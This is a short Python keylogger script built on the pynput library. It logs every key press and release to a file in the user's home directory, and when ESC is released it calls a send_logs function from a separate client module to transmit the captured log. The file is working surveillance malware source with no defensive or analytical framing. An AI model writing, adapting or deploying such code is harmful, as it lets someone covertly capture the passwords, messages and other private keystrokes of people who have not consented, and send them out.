# Import required modules
import logging
from pynput import keyboard
from client import send_logs

# Path to directory for storing keylogs - User home (~) directory
log_dir = "~/"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

# Event - A key is pressed
def on_press(key):
    try:
        logging.info('{0} pressed'.format(
            key.char))
    except AttributeError:
        logging.info('{0} pressed'.format(
            key))

# Event - A key is released
def on_release(key):
    logging.info('{0} released'.format(
        key))
    # If ESC key was pressed and released, then
    if key == keyboard.Key.esc:
        # Stop the listener
        send_logs()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
